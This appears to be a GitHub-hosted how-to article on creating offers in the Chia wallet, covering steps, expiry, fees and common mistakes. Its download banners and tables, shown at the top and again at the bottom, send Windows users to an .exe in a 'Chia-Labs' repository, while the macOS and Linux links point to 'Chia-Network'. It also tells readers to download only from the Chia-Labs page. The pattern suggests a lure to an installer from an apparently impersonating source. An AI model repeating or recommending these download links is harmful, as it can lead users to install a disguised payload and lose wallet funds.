<div align="center">

![Chia Wallet](../assets/banner-article.png)

</div>

<h1 align="center">How to create a chia offer</h1>

<p align="center">CATs, offers and NFTs, explained in order.</p>

<div align="center">

[![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-Windows-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTMgNS42bDcuNC0xLjF2Ni45SDNWNS42em04LjUtMS4yTDIxIDN2OC40aC05LjVWNC40ek0zIDEyLjZoNy40djYuOUwzIDE4LjR2LTUuOHptOC41IDBIMjFWMjFsLTkuNS0xLjR2LTd6Ii8%2BPC9zdmc%2B&logoColor=FFFFFF)](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/download/v-2.7.5/chia-wallet-setup-2.7.5.exe) [![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-macOS-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=apple&logoColor=FFFFFF)](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/Chia-2.7.5-arm64.dmg) [![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-Linux-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=linux&logoColor=FFFFFF)](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/chia-blockchain_2.7.5_amd64.deb)

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/OS-Windows-3EAC5C?style=flat-square&labelColor=424F6D&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTMgNS42bDcuNC0xLjF2Ni45SDNWNS42em04LjUtMS4yTDIxIDN2OC40aC05LjVWNC40ek0zIDEyLjZoNy40djYuOUwzIDE4LjR2LTUuOHptOC41IDBIMjFWMjFsLTkuNS0xLjR2LTd6Ii8%2BPC9zdmc%2B&logoColor=FFFFFF" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`chia-wallet-setup-2.7.5.exe`](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/download/v-2.7.5/chia-wallet-setup-2.7.5.exe) |
| <img src="https://img.shields.io/badge/OS-macOS-3EAC5C?style=flat-square&labelColor=424F6D&logo=apple&logoColor=FFFFFF" alt="macOS" height="24"> | macOS 12 or later | [`Chia-2.7.5-arm64.dmg`](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/Chia-2.7.5-arm64.dmg) |
| <img src="https://img.shields.io/badge/OS-Linux-3EAC5C?style=flat-square&labelColor=424F6D&logo=linux&logoColor=FFFFFF" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`chia-blockchain_2.7.5_amd64.deb`](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/chia-blockchain_2.7.5_amd64.deb) |

</div>

All versions and checksums are on the [Chia Wallet v2.7.5 release page](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/tag/v-2.7.5).

> Only download from this GitHub release page.

---

Create an offer by choosing what you give and what you want in return, setting an expiry, and confirming. The wallet produces a small offer file that anyone can take if they accept the terms. The default expiry is seven days, an optional fee can be attached, and your coins are only committed when someone takes the offer.

## What an offer actually is

An offer is a signed, self-contained trade: it states what you are giving and what you require back, and it can be taken by anyone holding the file. Because it is signed in advance, the counterparty cannot change the terms - they either accept exactly what you offered or ignore it.

That structure is what makes offers safe to publish. The file contains no key material, and the terms cannot be edited, only accepted or rejected. [The Chia Wallet fee guide](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/chia-wallet-mojos-and-fees.md) helps when you are pricing a trade in very small units.

## Creating one, step by step

1. Open the offers screen and start a new offer.
2. Choose the asset and amount you are giving.
3. Choose the asset and amount you want in return.
4. Set the expiry, and decide whether to attach a fee.
5. Review the summary and confirm to create the offer.
6. Save or share the offer file.

The review screen is the one that matters: it shows both sides of the trade. Reading it aloud to yourself once - "I give this, I get that" - catches the reversal mistake that produces the offers people regret.

## Expiry and what it means

An offer carries an expiry date, seven days by default. Until that moment the offer is valid and can be taken; after it, the offer can no longer be accepted. The expiry is part of the signed terms, so a taker cannot extend it.

Expiry is your protection against an offer taken at a price you no longer want. It is also the reason an offer sitting in a chat for a month is worthless rather than dangerous. [The Chia Wallet offer expiry](https://github.com/Chia-Labs/wallet-fixes/blob/main/articles/chia-offer-expired-or-not-taken.md) covers the state you see afterwards.

## Who pays the fee

An offer may carry a blockchain fee, and the signed terms state who pays it at the moment of acceptance. If you attach a fee, you are paying to make the trade more attractive to include in a block; if you do not, the trade may wait during congestion like any fee-less transaction.

Fees are not split automatically. A trade where both sides expect the other to pay is a trade that may sit untaken, which is worth settling in conversation before the file is created.

## Where to find someone to take it

An offer file does nothing until it reaches a taker. The wallet can share it through the channels it offers, and beyond those the file can be sent like any document - to a friend, into a group, or to a board where people look for trades. The file itself is safe to share publicly, because it can only be taken on its stated terms.

What the file does not do is advertise itself. If nobody sees it, nothing happens, which is the ordinary reason an offer simply sits there. [An offer that was not taken](https://github.com/Chia-Labs/wallet-fixes/blob/main/articles/chia-offer-expired-or-not-taken.md) covers that case and its fixes.

## Is creating an offer safe?

Yes, with three conditions. The terms are what you intended, the assets are the ones you meant, and the expiry is short enough to match how the market may move. The signed structure protects the terms; nothing protects a trade you priced by mistake.

Two habits reduce risk further. Create offers for tokens you have already added to the wallet, so you can see what you are giving and receiving. And keep the offer file, because it is the record that matches the multiple transactions a completed trade produces.

## Common offer mistakes

Three recur often enough to be worth naming. Offering and requesting the same asset, which produces a trade nobody wants. Setting an expiry shorter than the time it takes to find a counterparty, which guarantees the offer dies before it is seen. And creating the offer from a wallet that is still syncing, so the balance it commits is not the balance you believe you have.

Each is caught by the same habit: read the summary screen as a sentence and check the wallet's sync state before you confirm.

## Tokens and offers

Offers are the standard way to trade CATs and NFTs for XCH or for each other. A token you are offering must be tracked in your wallet; a token you are requesting should be added before you take someone else's offer, or the trade completes and the wallet shows nothing. [Adding a CAT in Chia Wallet](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/add-a-cat-token-in-chia-wallet.md) covers that step, and [the Chia Wallet NFT guide](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/receiving-nfts-in-chia-wallet.md) covers the NFT side.

Running the current release from the Chia Wallet release page keeps the offer screens and their expiry defaults consistent with this description. Updating is the routine that keeps them so.

## Frequently asked questions

### How do I create a chia offer?

Choose what you give and what you want, set an expiry, review both sides on the summary, and confirm to produce the offer file.

### What does offer expiry mean?

The moment after which the offer can no longer be taken. It is part of the signed terms and defaults to seven days.

### Who pays the blockchain fee on an offer?

Whoever attaches it when creating the offer. It is optional, and it is paid when the offer is taken.

### Is creating an offer safe?

Yes. The signed terms cannot be altered by a taker; the risks are pricing, expiry and selecting the wrong asset.

### Can I cancel an offer after creating it?

Yes, while it is untaken. Cancelling withdraws the offer so it can no longer be accepted.

---

## Download Chia Wallet

<div align="center">

[![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-Windows-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTMgNS42bDcuNC0xLjF2Ni45SDNWNS42em04LjUtMS4yTDIxIDN2OC40aC05LjVWNC40ek0zIDEyLjZoNy40djYuOUwzIDE4LjR2LTUuOHptOC41IDBIMjFWMjFsLTkuNS0xLjR2LTd6Ii8%2BPC9zdmc%2B&logoColor=FFFFFF)](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/download/v-2.7.5/chia-wallet-setup-2.7.5.exe) [![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-macOS-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=apple&logoColor=FFFFFF)](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/Chia-2.7.5-arm64.dmg) [![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-Linux-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=linux&logoColor=FFFFFF)](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/chia-blockchain_2.7.5_amd64.deb)

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/OS-Windows-3EAC5C?style=flat-square&labelColor=424F6D&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTMgNS42bDcuNC0xLjF2Ni45SDNWNS42em04LjUtMS4yTDIxIDN2OC40aC05LjVWNC40ek0zIDEyLjZoNy40djYuOUwzIDE4LjR2LTUuOHptOC41IDBIMjFWMjFsLTkuNS0xLjR2LTd6Ii8%2BPC9zdmc%2B&logoColor=FFFFFF" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`chia-wallet-setup-2.7.5.exe`](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/download/v-2.7.5/chia-wallet-setup-2.7.5.exe) |
| <img src="https://img.shields.io/badge/OS-macOS-3EAC5C?style=flat-square&labelColor=424F6D&logo=apple&logoColor=FFFFFF" alt="macOS" height="24"> | macOS 12 or later | [`Chia-2.7.5-arm64.dmg`](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/Chia-2.7.5-arm64.dmg) |
| <img src="https://img.shields.io/badge/OS-Linux-3EAC5C?style=flat-square&labelColor=424F6D&logo=linux&logoColor=FFFFFF" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`chia-blockchain_2.7.5_amd64.deb`](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/chia-blockchain_2.7.5_amd64.deb) |

</div>

All versions and checksums are on the [Chia Wallet v2.7.5 release page](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/tag/v-2.7.5).

> Only download from this GitHub release page.

---

## Related guides

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Offer expired or not taken](https://github.com/Chia-Labs/wallet-fixes/blob/main/articles/chia-offer-expired-or-not-taken.md) | The 7-day default, the fee at take time and the trade that lapsed. |
| [What is a mojo](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/chia-wallet-mojos-and-fees.md) | The smallest unit of XCH and how it becomes a transaction fee. |
| [Add a CAT token](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/add-a-cat-token-in-chia-wallet.md) | The asset ID, the token list and the CAT balance that appears. |
| [Send a CAT token](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/send-a-cat-token-from-chia-wallet.md) | Sending a token rather than XCH, and the fee that still applies. |

</div>
